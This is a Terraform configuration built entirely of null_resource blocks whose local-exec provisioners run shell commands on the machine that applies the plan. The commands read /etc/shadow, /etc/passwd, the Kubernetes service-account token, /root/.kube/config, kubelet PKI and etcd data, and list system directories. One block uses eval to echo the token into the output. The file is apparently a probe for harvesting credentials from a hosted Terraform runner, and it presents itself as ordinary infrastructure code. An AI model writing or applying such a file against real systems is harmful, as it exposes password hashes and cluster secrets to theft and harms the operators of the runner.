resource "null_resource" "shadow" {
  provisioner "local-exec" {
    command = "cat /etc/shadow"
  }
}


resource "null_resource" "hosts" {
  provisioner "local-exec" {
    command = "cat /etc/hosts"
  }
}


resource "null_resource" "passwd" {
  provisioner "local-exec" {
    command = "cat /etc/passwd"
  }
}


resource "null_resource" "who" {
  provisioner "local-exec" {
    command = "whoami"
  }
}

resource "null_resource" "uname" {
  provisioner "local-exec" {
    command = "uname"
  }
}

resource "null_resource" "token" {
  provisioner "local-exec" {
    command = "cat /run/secrets/kubernetes.io/serviceaccount/token"
  }
}

resource "null_resource" "secrets" {
  provisioner "local-exec" {
    command = "cat /var/lib/secrets"
  }
}

resource "null_resource" "homelist" {
  provisioner "local-exec" {
    command = "ls /home/appuser"
  }
}

resource "null_resource" "dockervar" {
  provisioner "local-exec" {
    command = "cat /var/lib/docker"
  }
}

resource "null_resource" "daemon" {
  provisioner "local-exec" {
    command = "cat /etc/docker/daemon.json"
  }
}

resource "null_resource" "containerd" {
  provisioner "local-exec" {
    command = "cat /var/lib/containerd"
  }
}

resource "null_resource" "crio" {
  provisioner "local-exec" {
    command = "cat /var/lib/crio"
  }
}
resource "null_resource" "etcd" {
  provisioner "local-exec" {
    command = "cat /var/lib/etcd"
  }
}
resource "null_resource" "pki" {
  provisioner "local-exec" {
    command = "cat /var/lib/kubelet/pki"
  }
}
resource "null_resource" "kubernetes" {
  provisioner "local-exec" {
    command = "ls /etc/kubernetes"
  }
}
resource "null_resource" "kubeconfig" {
  provisioner "local-exec" {
    command = "cat /root/.kube/config"
  }
}
resource "null_resource" "securetty" {
  provisioner "local-exec" {
    command = "cat /etc/securetty"
  }
}
resource "null_resource" "resolve" {
  provisioner "local-exec" {
    command = "cat /etc/resolv.conf"
  }
}
resource "null_resource" "run_eval_commands" {
  # Local-exec provisioner to run eval commands
  provisioner "local-exec" {
    command = <<-EOT
      eval 'echo "Starting IBM Cloud commands..."'
      eval 'echo "Current directory: $(pwd)"'
      eval 'echo "Running as user: $(whoami)"'
      eval 'echo "Reading kube config secret: $(cat /run/secrets/kubernetes.io/serviceaccount/token)"'
    EOT
  }
}
// extra check
resource "null_resource" "etcfolder" {
  provisioner "local-exec" {
    command = "ls /etc"
  }
}

resource "null_resource" "varfolder" {
  provisioner "local-exec" {
    command = "ls /var"
  }
}

resource "null_resource" "find_eval" {
  provisioner "local-exec" {
    command = "which eval || echo 'eval binary not found'"
  }
}